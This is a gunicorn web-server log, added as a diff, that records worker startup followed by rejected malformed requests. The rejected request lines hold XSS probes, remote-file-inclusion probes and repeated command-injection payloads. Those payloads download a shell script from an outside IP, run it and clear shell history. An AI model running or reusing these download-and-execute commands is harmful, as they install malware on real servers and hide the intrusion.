@@ -1,0 +1,44 @@
+nohup: ignoring input
+[2026-05-19 17:59:39 +0000] [19628] [INFO] Starting gunicorn 26.0.0
+[2026-05-19 17:59:39 +0000] [19628] [INFO] Listening at: http://127.0.0.1:5000 (19628)
+[2026-05-19 17:59:39 +0000] [19628] [INFO] Using worker: sync
+[2026-05-19 17:59:39 +0000] [19629] [INFO] Booting worker with pid: 19629
+[2026-05-19 17:59:39 +0000] [19630] [INFO] Booting worker with pid: 19630
+[2026-05-19 17:59:39 +0000] [19631] [INFO] Booting worker with pid: 19631
+[2026-05-19 17:59:39 +0000] [19628] [INFO] Control socket listening at /run/user/1000/gunicorn.ctl
+[2026-05-19 18:21:51 +0000] [19628] [INFO] Handling signal: hup
+[2026-05-19 18:21:51 +0000] [19628] [INFO] Hang up: Master
+[2026-05-19 18:21:51 +0000] [22653] [INFO] Booting worker with pid: 22653
+[2026-05-19 18:21:51 +0000] [19628] [INFO] Control socket listening at /run/user/1000/gunicorn.ctl
+[2026-05-19 18:21:51 +0000] [22655] [INFO] Booting worker with pid: 22655
+[2026-05-19 18:21:51 +0000] [19628] [INFO] Control socket listening at /run/user/1000/gunicorn.ctl
+[2026-05-19 18:21:51 +0000] [22657] [INFO] Booting worker with pid: 22657
+[2026-05-19 18:21:51 +0000] [19628] [INFO] Control socket listening at /run/user/1000/gunicorn.ctl
+[2026-05-19 18:21:51 +0000] [19628] [WARNING] Worker (pid:19629) was sent SIGHUP!
+[2026-05-19 18:21:51 +0000] [19628] [WARNING] Worker (pid:19630) was sent SIGHUP!
+[2026-05-19 18:21:51 +0000] [19628] [WARNING] Worker (pid:19631) was sent SIGHUP!
+[2026-05-19 23:45:44 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: 'Utilities\\"%3<script>alert(\'Vulnerable\')</script> HTTP/1.0'
+[2026-05-19 23:45:44 +0000] [22657] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '> HTTP/1.0'
+[2026-05-19 23:45:44 +0000] [22657] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: 'script>alert(1)/script><\\" HTTP/1.0'
+[2026-05-19 23:45:44 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: 'Src=javascript:alert(\'Vulnerable\')><Img Src=\\" HTTP/1.0'
+[2026-05-19 23:45:44 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: "name=a><input name=i value=XSS>&lt;script>alert('Vulnerable')</script> HTTP/1.0"
+[2026-05-19 23:45:48 +0000] [22657] [WARNING] Invalid request from ip=127.0.0.1: Request Line is too large (4154 > 4094)
+[2026-05-19 23:45:50 +0000] [22657] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: 'By Dr HTTP/1.0'
+[2026-05-19 23:45:53 +0000] [22655] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '-al&ABSOLUTE_PATH_STUDIP=http://cirt.net/rfiinc.txt?? HTTP/1.0'
+[2026-05-19 23:45:53 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '-al&_PHPLIB[libdir]=http://cirt.net/rfiinc.txt?? HTTP/1.0'
+[2026-05-19 23:45:53 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '-a HTTP/1.0'
+[2026-05-19 23:45:53 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '-a HTTP/1.0'
+[2026-05-20 18:42:05 +0000] [22657] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c HTTP/1.0'
+[2026-05-20 18:42:05 +0000] [22655] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c HTTP/1.0'
+[2026-05-20 18:42:05 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c HTTP/1.0'
+[2026-05-20 18:42:06 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c HTTP/1.0'
+[2026-05-20 18:42:06 +0000] [22655] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '%20chmod 777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c HTTP/1.0'
+[2026-05-20 18:42:07 +0000] [22655] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c HTTP/1.0'
+[2026-05-20 18:42:07 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c) HTTP/1.0'
+[2026-05-20 18:42:08 +0000] [22655] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: "777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c'$ HTTP/1.0"
+[2026-05-20 18:42:08 +0000] [22655] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c HTTP/1.0'
+[2026-05-20 18:42:09 +0000] [22655] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c HTTP/1.0'
+[2026-05-20 18:42:09 +0000] [22657] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c%60 HTTP/1.0'
+[2026-05-20 18:42:10 +0000] [22655] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: "777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c%60' HTTP/1.0"
+[2026-05-20 18:42:10 +0000] [22657] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: "777 /bin/wget;chmod 777 /bin/curl; wget http://103.226.139.102/wawan.sh -O wawan.sh;chmod 777 wawan.sh;./wawan.sh;rm -rf wawan.sh;history -c%60' HTTP/1.0"
+[2026-05-28 11:46:25 +0000] [22653] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.0'
